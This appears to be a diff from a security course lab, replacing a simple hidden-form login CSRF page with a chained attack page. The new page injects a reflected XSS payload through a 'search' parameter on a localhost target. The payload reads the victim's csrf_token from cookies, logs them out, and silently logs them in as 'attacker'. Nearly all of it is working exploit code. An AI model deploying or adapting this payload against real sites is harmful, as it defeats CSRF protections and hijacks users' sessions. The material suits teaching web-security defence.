@@ -1,15 +1,41 @@
-<html>
-    <iframe name="displaynone", style="display: none"></iframe>
-    <form id="thing", target="displaynone", action="http://localhost/project2/login", method="post", style="display: none">
-        <input name="csrf_token", value="54ee32609aae5541c6bd690e5f2d3c6d">
-        <input name="username", value="attacker">
-        <input name ="password", value="l33th4x">
-        <!-- <input name="csrfdefence", value="0">
-        <input name="xssdefence", value="4"> -->
-    </form>
+<meta charset="utf-8">
 
-    <script>
-        document.getElementById("thing").submit()
-    </script>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+function payload(attacker) {
+    $("html").hide();
+    $("html").load("./", function() {
+        window.history.pushState({page: 1}, "page 1", "./");
+        var cookie = document.cookie.toString();
+        var trimmed = cookie.substring(cookie.indexOf("csrf_token") + "csrf_token=".length);
+        var token = trimmed.substring(0, trimmed.indexOf(";"));
+         
+        $('<iframe name="displaynone", style="display: none"></iframe>').appendTo('html');
 
-</html>
+        if($("#log-out-btn").length) {
+            $('<form id="logout", target="displaynone", action="http://localhost/project2/logout", method="post", style="display: none">').appendTo('html');
+            $('<input name="csrf_token", value="'+ token +'">').appendTo("#logout");
+            $("#logout").submit();
+        }
+
+        $('<form id="csrf", target="displaynone", action="http://localhost/project2/login", method="post", style="display: none">').appendTo('html');
+        $('<input name="csrf_token", value="'+ token +'">').appendTo("#csrf");
+        $('<input name="username", value="attacker">').appendTo("#csrf");
+        $('<input name ="password", value="l33th4x">').appendTo("#csrf");
+        $('<input name="xssdefence", value="0">').appendTo("#csrf");
+        $('<input name="csrfdefence", value="1">').appendTo("#csrf");
+        $('#csrf').submit();
+    });
+}
+
+var attacker = window.location.href;
+var target = "http://localhost/project2/";
+
+$(function() {
+    var url = target + "./search?csrfdefense=1&xssdefense=0&q=" + 
+        encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + 
+        attacker + "\");" + "<" + "/script" + ">");
+    window.location.href = url;
+});
+
+</script>
